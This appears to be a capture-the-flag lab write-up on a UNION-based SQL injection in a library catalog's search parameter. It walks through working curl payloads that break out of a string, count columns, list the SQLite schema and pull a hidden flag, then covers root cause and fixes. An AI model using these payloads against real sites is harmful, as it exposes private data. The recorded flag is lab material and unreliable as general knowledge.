# Public Library Pwnbox Lab - UNION SQL Injection in Title Search

Date: 2026-07-08
Target type: CTF/lab
Bug class: SQL injection in string literal, SQLite UNION exfiltration, hidden table disclosure

## Observation

Library catalog app at `https://19e9c10a5d6c.pwnbox-lab.com/`.

Initial page hints:

- "Browse our card catalog. Search by book title."
- Search form uses `GET /?q=...`.
- Challenge text: the query "only ever returns book records" and the flag is in a separate admin table.

Search results render as a 2-column table:

- `Title`
- `Author`

Visible error panel reflects SQL parser output.

## Hypothesis

The `q` parameter is interpolated into a quoted SQL string, likely in a `LIKE` clause over the `books` table. If the quote can be broken and `UNION` is permitted, rows from another table can be projected into the same 2-column result set and displayed as normal search results.

## Evidence

### Quote probe

```bash
curl -sS "https://19e9c10a5d6c.pwnbox-lab.com/?q=%27"
```

Response error:

```text
unrecognized token: "'"
```

This confirmed string-literal context and SQLite error messaging.

### Projection width

```bash
curl -sS "https://19e9c10a5d6c.pwnbox-lab.com/?q=%27%20UNION%20SELECT%201,2--"
```

Response included a synthetic row:

```text
1 | 2
```

`' UNION SELECT 1,2,3--` failed with:

```text
SELECTs to the left and right of UNION do not have the same number of result columns
```

So the base query returns exactly 2 columns.

### SQLite schema enumeration

```bash
curl -sS "https://19e9c10a5d6c.pwnbox-lab.com/?q=%27%20UNION%20SELECT%20sql,%20%27x%27%20FROM%20sqlite_master%20WHERE%20type=%27table%27--"
```

Returned schema rows including:

```sql
CREATE TABLE books (
    id INTEGER PRIMARY KEY,
    title TEXT NOT NULL,
    author TEXT NOT NULL,
    year INTEGER
)
```

and:

```sql
CREATE TABLE flags (
    value TEXT NOT NULL
)
```

### Flag extraction

```bash
curl -sS "https://19e9c10a5d6c.pwnbox-lab.com/?q=%27%20UNION%20SELECT%20value,%20%27x%27%20FROM%20flags--"
```

Returned row:

```text
pwnbox{c2e4f6a8b0d2e4f6a8b0c2d4e6f8a0b2} | x
```

## Test

1. Confirm normal search behavior with a benign query.
2. Break out of the quoted string using `'`.
3. Use `UNION` to determine column count.
4. Enumerate tables through `sqlite_master`.
5. Read the hidden `flags` table directly.

## Result

Confirmed chain:

```text
User-controlled q parameter
-> interpolated into SQL string literal
-> quote breakout
-> 2-column UNION injection
-> sqlite_master reveals flags table
-> flags.value projected into result table
```

Flag:

```text
pwnbox{c2e4f6a8b0d2e4f6a8b0c2d4e6f8a0b2}
```

## Why Failed Assumptions Failed

1. **"Only book records come back"** — false; `UNION` can append arbitrary rows to the same projection.
2. **Separate admin table is unreachable** — false; it sits in the same SQLite database and is readable by the same query context.
3. **Need boolean-only bypass** — unnecessary; full `UNION SELECT` was available.
4. **Need 3 columns** — incorrect; the visible result set has 2 columns.

## Why Working Payloads Worked

The search input was used inside a quoted SQL expression and not parameterized. Once the quote was closed, `UNION SELECT` could supply a second query with the same 2-column shape as the base `books` query. SQLite metadata in `sqlite_master` exposed the hidden schema, and the `flags` table contained a single readable `value` column.

## Root Cause

1. Unparameterized concatenation of `q` into the SQL query.
2. No escaping or prepared statements for string-literal input.
3. Hidden admin data remained in the same database and under the same DB privileges as public search queries.

## Impact

- Read hidden tables outside the intended `books` catalog.
- Enumerate schema and extract arbitrary data visible to the SQLite connection.
- In a real app, potential exposure of credentials, admin notes, or internal user data.

## Fix

- Use parameterized queries for `LIKE` searches.
- Do not concatenate raw input into SQL strings.
- Separate privileged tables from public read paths via DB permissions or separate databases.
- Suppress raw SQL error messages from user-facing responses.

## Regression Test

- `'` must not change SQL syntax or produce raw DB errors.
- `UNION SELECT 1,2--` must not inject a visible row.
- Queries against `sqlite_master` and hidden tables must be impossible from the public search box.

## Report Summary

Public Library exposed a SQLite SQL injection in the `q` title search parameter. A single quote confirmed string-literal injection, `UNION SELECT 1,2--` proved a 2-column result shape, and `sqlite_master` revealed a hidden `flags` table. Injecting `UNION SELECT value, 'x' FROM flags--` returned the flag directly in the public search results.
